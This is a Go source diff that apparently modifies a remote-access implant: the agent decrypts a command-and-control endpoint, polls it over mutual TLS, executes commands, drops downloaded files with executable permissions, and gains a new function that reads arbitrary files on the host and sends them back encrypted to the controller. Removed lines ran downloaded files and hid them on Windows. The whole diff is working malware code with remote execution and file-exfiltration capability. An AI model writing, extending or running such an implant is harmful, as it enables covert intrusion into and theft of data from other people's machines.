@@ -6,11 +6,12 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io/fs"
 	"io/ioutil"
 	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
+	"path/filepath"
 	"strconv"
 	"sync"
 	"syscall"
@@ -35,19 +36,13 @@ var (
 	InitAESKey      string
 	X1              string
 	X2              string
-	InitPFile       string
-	CmdMap          = make(map[int]func(*models.KarResponseObjectCmd, ...models.MultiType) error)
 )
 
 func main() {
 	// Assign known commands to command function map
-	CmdMap[1] = ex.Do
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
 	waitSecondsInt, _ := strconv.Atoi(InitWaitSeconds)
-	if _, err := os.Stat(InitPFile); err == nil {
-		HideF(InitPFile)
-	}
 	ticker := time.NewTicker(time.Duration(time.Duration(waitSecondsInt) * time.Second))
 	endpointStr, err := kryptor.Decrypt(c2Endpoint, X1, X2)
 	if err != nil {
@@ -64,106 +59,77 @@ func main() {
 	wg.Add(2)
 	go awaitCmd(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving commands
 
-	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, InitPFile, ticker, mTLSClient) // thread handling receiving files
+	go awaitFile(string(endpointStr), string(UUID), X1, X2, InitAESKey, ticker, mTLSClient) // thread handling receiving files
 
 	wg.Wait()
 }
 
-func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey, pFile string, ticker *time.Ticker, mTLSClient *http.Client) {
+func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
 	for range ticker.C {
-		fObject, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
-		if err == nil {
-			prevCmd = cmdID
-			fileObj := &models.KarObjectFile{}
-			if err := json.Unmarshal(fObject, fileObj); err != nil {
-				continue
-			}
-			filename := fileObj.FileName
-			if err = os.WriteFile(filename, fileObj.FileBytes, 0744); err != nil {
-				continue
-			}
-			if broadcast {
-				go handleFile(cmdID, filename, c2Endpoint, UUID, kX1, kX2, aesKey, pFile, mTLSClient)
-			} else {
-				// Packer only handles encrypted files (fileObj.FileBytes is encrypted)
-				cmd := exec.Command(pFile, filename)
-				var cout, cerr bytes.Buffer
-				cmd.Stderr = &cerr
-				cmd.Stdout = &cout
-				retObj := &models.KarResponseObjectFile{}
-				if err := cmd.Run(); err != nil {
-					retObj.Error = 1
-					retObj.ErrVal = cerr.String()
-				}
-				retObj.RetVal = cout.String()
-				bytes, _ := json.Marshal(fileObj)
-				bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
-				if err != nil {
-					continue
-				}
-				go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-					CmdID:  cmdID,
-					Type:   2,
-					Object: bytes,
-				})
-			}
+		fObject, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
+		if err != nil {
+			continue
 		}
+		prevCmd = cmdID
+		fileObj := &models.KarObjectFile{}
+		if err := json.Unmarshal(fObject, fileObj); err != nil {
+			continue
+		}
+		filename := fileObj.FileName
+		resObj := &models.KarResponseObjectFile{}
+		var perm fs.FileMode = 0600
+		ext := filepath.Ext(filename)
+		if ext == ".exe" || ext == ".bat" || ext == ".cmd" {
+			perm = 0700
+		}
+		if err = os.WriteFile(filename, fileObj.FileBytes, perm); err != nil {
+			resObj.Error = 1
+			resObj.ErrVal = err.Error()
+		}
+		bytes, _ := json.Marshal(resObj)
+		bytes, err = kes.EncryptObject(bytes, aesKey, kX1, kX2)
+		if err != nil {
+			continue
+		}
+		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+			CmdID:  cmdID,
+			Type:   2,
+			Object: bytes,
+		})
 	}
 }
 
 func awaitCmd(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
 	for range ticker.C {
-		cmdObjectBytes, cmdID, broadcast, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
+		cmdObjectBytes, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "1")
 		if err == nil {
 			cmdObj := &models.KarObjectCmd{}
 			if err := json.Unmarshal(cmdObjectBytes, cmdObj); err != nil {
 				continue
 			}
 			prevCmd = cmdID
-			go parseCmdObject(cmdObj, cmdID, c2Endpoint, UUID, broadcast, kX1, kX2, aesKey, mTLSClient)
+			go parseCmdObject(cmdObj, cmdID, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient)
 		}
 	}
 }
 
-// This only runs if file was not encrypted
-func handleFile(cmdID int, fname, c2Endpoint, UUID string, kX1, kX2, aesKey, pFile string, mTLSClient *http.Client) {
-	HideF(fname)
-	cmd := exec.Command(fname)
-	fileObj := models.KarResponseObjectFile{}
-	var cout, cerr bytes.Buffer
-	cmd.Stderr = &cerr
-	cmd.Stdout = &cout
-	retObj := &models.KarResponseObjectFile{}
-	if err := cmd.Run(); err != nil {
-		retObj.Error = 1
-		retObj.ErrVal = cerr.String()
-	}
-	retObj.RetVal = cout.String()
-	bytes, _ := json.Marshal(fileObj)
-	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-		CmdID:  cmdID,
-		Type:   2,
-		Object: bytes,
-	})
-}
-
-func getObjectBytes(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client, dataType string) ([]byte, int, bool, error) {
+func getObjectBytes(prevCmd int, Endpoint, UUID, kX1, kX2, aesKey string, mTLSClient *http.Client, dataType string) ([]byte, int, error) {
 	genericObj, err := requestData(Endpoint, UUID, dataType, mTLSClient)
 	if err != nil {
-		return nil, 0, false, err
+		return nil, 0, err
 	}
 	if len(genericObj.UUID) != 0 {
 		genericObj.Object, err = kes.DecryptObject(genericObj.Object, aesKey, kX1, kX2)
 		if err != nil {
-			return nil, 0, false, err
+			return nil, 0, err
 		}
 	}
 	if genericObj.CmdID == prevCmd {
-		return nil, 0, false, fmt.Errorf("")
+		return nil, 0, fmt.Errorf("")
 	}
-	return genericObj.Object, genericObj.CmdID, genericObj.UUID == "", nil
+	return genericObj.Object, genericObj.CmdID, nil
 }
 
 func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*models.GenericData, error) {
@@ -199,36 +165,50 @@ func requestData(Endpoint, UUID, dataType string, mTLSClient *http.Client) (*mod
 	return genericObj, nil
 }
 
-func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, broadcast bool, kX1, kX2, aesKey string, mTLSClient *http.Client) {
+func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID string, kX1, kX2, aesKey string, mTLSClient *http.Client) {
 	responseObject := &models.KarResponseObjectCmd{}
-	cmdlet, args := cmdObject.Cmd, cmdObject.Args
-	f, ok := CmdMap[cmdlet]
+	filesObject := []models.KarObjectFile{}
+	var respObjectBytes []byte
+	objType := 1
 	var err error
-	if !ok {
-		responseObject.Code = 1
-	} else {
-		err = f(responseObject, args...)
+	cmdlet, args := cmdObject.Cmd, cmdObject.Args
+	switch cmdlet {
+	case 1:
+		err := ex.Do(responseObject, args...)
 		if err != nil {
 			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
+		}
+	case 3:
+		objType = 3
+		err := getFiles(&filesObject, args...)
+		if err != nil {
+			objType = 1
+			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
 		}
 	}
-	respObjectBytes, err := json.Marshal(responseObject)
-	if err == nil {
-		if !broadcast {
-			respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
-			if err != nil {
-				log.Error("")
-				return
-			}
+	if objType == 1 {
+		respObjectBytes, err = json.Marshal(responseObject)
+		if err != nil {
+			return
 		}
-		go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
-			Type:   1, // data type 1 is a command
-			CmdID:  cmdID,
-			Object: respObjectBytes,
-		})
-	} else {
-		log.Error(err)
+	} else if objType == 3 {
+		respObjectBytes, err = json.Marshal(filesObject)
+		if err != nil {
+			return
+		}
 	}
+	respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
+	if err != nil {
+		log.Error("")
+		return
+	}
+	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
+		Type:   objType, // data type 1 is a command
+		CmdID:  cmdID,
+		Object: respObjectBytes,
+	})
 }
 
 // generic enough to be called anytime
@@ -260,6 +240,23 @@ func HideF(filename string) error {
 	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
 	if err != nil {
 		return err
+	}
+	return nil
+}
+
+func getFiles(files *[]models.KarObjectFile, args ...models.MultiType) error {
+	if len(args) == 0 {
+		return fmt.Errorf("")
+	}
+	for _, path := range args {
+		bytes, err := os.ReadFile(path.StrValue)
+		if err != nil {
+			return err
+		}
+		*files = append(*files, models.KarObjectFile{
+			FileBytes: bytes,
+			FileName:  path.StrValue,
+		})
 	}
 	return nil
 }
